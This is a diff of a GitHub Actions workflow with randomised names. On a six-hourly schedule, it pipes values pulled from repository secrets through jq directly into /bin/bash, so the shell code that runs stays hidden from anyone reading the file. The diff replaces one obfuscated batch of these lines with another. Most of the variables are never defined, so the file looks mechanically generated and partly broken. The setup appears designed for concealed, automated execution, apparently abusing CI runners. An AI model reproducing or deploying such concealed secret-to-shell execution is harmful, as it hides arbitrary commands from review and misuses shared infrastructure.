@@ -3,29 +3,23 @@ name: weiguomen8713
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 4/6 * * *'
-jobs:  # 4901
+    - cron: '42 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: weiguomen8713
         env:
-          dyb7: ${{ secrets.dyb7 }}
+          jouu26711: ${{ secrets.jouu26711 }}
         run: |
-          echo $dyb7 | jq -r .igv4 | /bin/bash
-          echo $y438 | jq -r .dqw49384 | /bin/bash
-          echo $rlpmu09577 | jq -r .a2 | /bin/bash
-          echo $hoz92235 | jq -r .y712 | /bin/bash
-          echo $hcv476 | jq -r .xkcg2 | /bin/bash
-          echo $xqhrl9 | jq -r .zbty628 | /bin/bash
-          echo $ghm2 | jq -r .p067 | /bin/bash
-          echo $eiyuk043 | jq -r .vmd785 | /bin/bash
-          echo $plab459 | jq -r .m89 | /bin/bash
-          echo $innt60 | jq -r .mtn5 | /bin/bash
-          echo $lgkbg3817 | jq -r .yep0610 | /bin/bash
-          echo $ek533 | jq -r .ddci412 | /bin/bash
-          echo $orxvg482 | jq -r .mbd823 | /bin/bash
-          echo $yty11469 | jq -r .qcdt99 | /bin/bash
-          echo $b73 | jq -r .lvgbb3 | /bin/bash
+          echo $jouu26711 | jq -r .ld390 | /bin/bash
+          echo $muwdz10661 | jq -r .i5 | /bin/bash
+          echo $n765 | jq -r .h0993 | /bin/bash
+          echo $f7077 | jq -r .yg90167 | /bin/bash
+          echo $zo94007 | jq -r .iavwj2 | /bin/bash
+          echo $iou2 | jq -r .qfmqc74 | /bin/bash
+          echo $ndzgn165 | jq -r .nhmb8 | /bin/bash
+          echo $e06582 | jq -r .ebawd9 | /bin/bash
+          echo $knz5 | jq -r .yx6740 | /bin/bash
 
